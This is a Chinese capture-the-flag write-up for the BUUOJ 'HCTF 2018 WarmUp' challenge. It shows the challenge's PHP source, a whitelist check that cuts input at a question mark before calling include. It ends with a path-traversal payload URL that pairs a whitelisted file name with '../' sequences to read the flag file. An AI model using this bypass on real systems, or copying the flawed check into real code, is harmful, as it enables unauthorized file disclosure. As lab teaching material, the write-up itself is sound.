### buuoj_[HCTF 2018] WarmUp（文件包含）

打开界面查看源代码，发现文件source.php，访问看看，获得源码

```
class emmm
    {
        public static function checkFile(&$page)
        {
        	#白名单
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            #确认变量page是否声明，并判断是否为字符串。
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }
			#第一次在白名单内
            if (in_array($page, $whitelist)) {
                return true;
            }
			#分割变量，如果有问号，则保留问号之前的字符串
            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')#返回变量中问号出现的第一个位置
            );
            #第二次检测是是否在白名单
            if (in_array($_page, $whitelist)) {
                return true;
            }
			#对变量进行url解码
            $_page = urldecode($page);
            #第二次过滤问号
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            #第三次检测是否在白名单
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }#类结束

    if (! empty($_REQUEST['file'])	#file变量不为空
        && is_string($_REQUEST['file'])	#file的值是字符串
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    } 
```

可以看见还有一个hint.php文件，访问一下

![](https://pic.imgdb.cn/item/60f3c55f5132923bf8e477ff.jpg)

可以看见flag的文件名是ffffllllaaaagggg

因此可以直接构造playload

```
http://97f3b20f-2427-4615-a7ec-fc23ddd1245e.node4.buuoj.cn/?file=hint.php?../../../../../ffffllllaaaagggg
```

成功